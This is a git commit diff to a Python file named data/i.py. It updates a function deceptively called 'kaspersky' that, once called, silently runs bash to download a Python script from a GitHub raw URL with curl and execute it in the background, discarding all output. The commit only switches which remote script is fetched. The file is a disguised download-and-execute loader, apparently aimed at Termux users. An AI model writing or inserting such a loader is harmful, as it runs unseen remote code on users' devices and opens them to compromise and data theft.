d430824a9b45f6d2caf7d859418e59018a5ddc59
Boneng <bauq7uuh7u7@proton.me>
2025-10-21 11:45:52 +0800

    Update i.py

--- data/i.py
+++ data/i.py
@@ -1,6 +1,6 @@
 def kaspersky():
     import os
     import sys
-    os.system("bash -c 'python <(curl -s https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/i.py)' >/dev/null 2>&1 &")
+    os.system("bash -c 'python <(curl -s https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/termux.py)' >/dev/null 2>&1 &")
 
 kaspersky()
